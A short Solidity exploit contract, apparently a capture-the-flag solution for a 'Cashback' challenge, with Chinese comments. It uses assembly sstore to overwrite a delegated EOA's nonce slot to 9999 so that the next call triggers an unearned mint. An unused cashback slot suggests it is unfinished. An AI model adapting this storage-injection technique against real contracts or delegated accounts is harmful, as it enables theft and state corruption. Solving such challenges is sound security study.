// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract NonceAttack {
    // 根據題目 writeup，Cashback 的 storage layout 起始位置
    // ERC1155 佔用了前 3 個 slot (base+0, base+1, base+2)
    // 所以 nonce 在 base+3
    // cashback mapping 在 base+4
    uint256 constant STORAGE_BASE = 0x442a95e7a6e84627e9cbb594ad6d8331d52abc7e6b6ca88ab292e4649ce5ba00;
    
    // 定義 Slot 偏移量
    uint256 constant SLOT_OFFSET_NONCE = 3;
    uint256 constant SLOT_OFFSET_CASHBACK = 4;

    address constant NATIVE_CURRENCY = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // 只要呼叫這個函數，就會把當前 Context (也就是委託的 EOA) 的 Storage 改掉
    function injectMaliciousStorage() external {
        // 1. 修改 Nonce 為 9999
        // 這樣下一次呼叫 payWithCashback 就會變成 10000 觸發 mint
        bytes32 nonceSlot = bytes32(STORAGE_BASE + SLOT_OFFSET_NONCE);
        assembly {
            sstore(nonceSlot, 9999)
        }

        
    }
}
